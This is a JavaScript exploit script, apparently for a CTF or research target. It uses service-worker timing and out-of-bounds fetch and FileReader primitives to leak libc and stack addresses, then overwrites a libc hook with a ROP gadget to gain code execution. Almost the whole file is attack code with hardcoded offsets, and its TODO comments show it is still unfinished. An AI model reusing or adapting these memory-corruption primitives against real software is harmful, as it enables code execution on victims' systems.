// check if the service worker is installed and running

if (is_active) {
	// this is a regular task which will happen after any remaining microtasks
	setTimeout(function() { 
		// this microtask will be resolved at the end of this task
		Promise.resolve().then(async function() { await exploit(); });
	}, 0);
}

async function readtest(offset, len) {
	let response = await fetch("/lookup/?idx=0x" + offset.toString(16));
	return response;
}

// define our read/write primitives
async function rread(offset, len) {
	let response = await fetch("/lookup/?idx=0x" + offset.toString(16));
	let data = await response.arrayBuffer();
	log("Got response of length: " + data.byteLength);
	return new Uint8Array(data, 0, len);
	//return new Uint8Array(1);
}

async function rwrite(offset, data) {
	let blob = new Blob([data], {type : 'application/json'});
	let fr = new FileReader();
	fr.readAsArrayBuffer(blob, offset);
}

// https://stackoverflow.com/questions/40031688/javascript-arraybuffer-to-hex
function hexdump(buffer) {
  log(Array.prototype.map.call(new Uint8Array(buffer), x => ('0x' + x.toString(16))).join(' '));
}

// from here on out, we can use promises "asynchronously"
// to do a straight-line exploit
async function exploit() {
	log("beginning exploit");

	// first, spray several /dev/shm mappings
	var filereaders = [];
	/*for(let x = 0; x < 0x100; x++) {
		filereaders.push(await rwrite(0x1000, "A".repeat(0x4000)));
	}
	log(filereaders);*/

	// TODO:
	// write our ropchain to libc bss
	// overwrite one of the hooks with our stack pivot
	// trigger it to get code execution

	// leak a libc pointer
	let resp = readtest(0, 0x10000);
	let memmove_leak = await rread(0x110d7000+0x3ea018, 0x8);
	log(memmove_leak);
	hexdump(memmove_leak);
	let libc_leak = Sub(new Int64(memmove_leak), new Int64(0x17eda0));
	log("libc base: " + libc_leak.toString());

	// leak the stack pointer (libc + 0x3db4d8)
	let stack_leak = new Int64(await rread(0x110d7000+0x3db4d8, 0x8));
	log("stack leak: " + stack_leak.toString());

	// guess the current stack offset in the next rwrite call
	let guessed_stack = Sub(stack_leak, new Int64(0x20606));
	log("stack base: " + guessed_stack.toString());

	// calculate difference from our mapping
	let offset = Sub(guessed_stack, libc_leak);
	log("libc-stack offset: " + offset.toString());

	let mapping = Sub(libc_leak, new Int64(0x110d7000));
	log("mapping: " + mapping.toString());

	let gadget = Add(libc_leak, new Int64(0xd9763));

	log(gadget);

	// hit __free_hook 0x3dc8a8
	// strlen is the fcall
	await rwrite(0x110d7000+0x3da0a0, new Uint8Array(gadget.bytes()));
	//await rwrite(0x110d7000 + 0x3da0a0, "C".repeat(8));

}